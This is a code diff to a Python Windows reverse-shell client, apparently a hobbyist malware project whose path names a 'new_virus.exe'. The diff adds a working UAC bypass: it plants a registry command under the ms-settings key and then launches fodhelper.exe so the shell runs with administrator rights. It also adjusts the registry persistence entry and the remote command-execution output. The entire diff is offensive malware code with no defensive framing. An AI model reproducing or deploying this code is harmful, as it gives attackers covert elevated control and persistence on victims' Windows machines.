@@ -6,6 +6,7 @@ import json
 import uuid
 import socket
 import winreg
+import ctypes
 import requests
 import websocket
 import subprocess
@@ -24,10 +25,7 @@ def add_to_winregistry():
     # c:\users\current_user\desktop
     pth = os.path.dirname(os.path.realpath(__file__))
 
-    # name of the python file with extension
-    base = os.path.basename(__file__)
-    filename = os.path.splitext(base)[0]
-    s_name = filename + '.exe -r'
+    s_name = r'C:\Windows\System32\fodhelper.exe'
 
     # joins the file name to end of path address
     address = os.path.join(pth, s_name)
@@ -45,6 +43,72 @@ def add_to_winregistry():
 
     # now close the opened key
     winreg.CloseKey(open)
+
+
+class AdminPrivilegesManager(object):
+    def __init__(self):
+        self.cmd = r"C:\Users\User\Desktop\Reverse-Shell\dist\new_virus.exe -r"
+        self.fod_helper = r'C:\Windows\System32\fodhelper.exe'
+        self.python_cmd = "python"
+        self.reg_path = 'Software\Classes\ms-settings\shell\open\command'
+        self.delegate_exec_reg_key = 'DelegateExecute'
+        self.old_value = ''
+
+    def disable_file_system_redirection(self):
+        self.old_value
+        self.old_value = ctypes.c_long()
+        ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(self.old_value))
+
+    def enable_file_system_redirection(self):
+        self.old_value
+        ctypes.windll.kernel32.Wow64RevertWow64FsRedirection(self.old_value)
+
+    def is_running_as_admin(self):
+        """
+        Checks if the script is running with administrative privileges.
+        Returns True if is running as admin, False otherwise.
+        """
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+
+    def create_reg_key(self, key, value):
+        """
+        Creates a reg key
+        """
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.reg_path)
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.reg_path, 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
+            winreg.CloseKey(registry_key)
+        except WindowsError:
+            raise
+
+    def bypass_uac(self, cmd):
+        """
+        Tries to bypass the UAC
+        """
+        try:
+            self.create_reg_key(self.delegate_exec_reg_key, '')
+            self.create_reg_key(None, cmd)
+        except WindowsError:
+            raise
+
+    def main(self):
+        if not self.is_running_as_admin():
+            print('[!] The script is NOT running with administrative privileges')
+            print('[+] Trying to bypass the UAC')
+            try:
+                self.disable_file_system_redirection()
+                current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
+                cmd = '{} /k {} {}'.format(self.cmd, self.python_cmd, current_dir)
+                self.bypass_uac(cmd)
+            except Exception as e:
+                print(e)
+                sys.exit(1)
+        else:
+            print('[+] The script is running with administrative privileges!')
 
 
 class WebClient(object):
@@ -144,7 +208,7 @@ class Client(object):
             )
             output_bytes = command.stdout.read()
             error_bytes = command.stderr.read()
-            output_str = f'{os.getcwd()}$ {str(output_bytes, "utf-8") }{str(error_bytes, "utf-8")}'
+            output_str = f'{os.getcwd()}$ {str(output_bytes, "utf-8")}{str(error_bytes, "utf-8")}'
             output_str = output_str.replace('\n', '\r\n')
         return output_str
 
@@ -170,7 +234,14 @@ if __name__ == "__main__":
     arg = sys.argv[1]
     if arg == '-i':
         # Install mode
+        admin_privileges_manager = AdminPrivilegesManager()
+        admin_privileges_manager.main()
         add_to_winregistry()
+        print('added to registry')
+        fod_helper = r'C:\Windows\System32\fodhelper.exe'
+        subprocess.call(fod_helper, shell=True)
+        print('ran fodhelper.exe')
+
     elif arg == '-r':
         # Run mode
         client = Client()
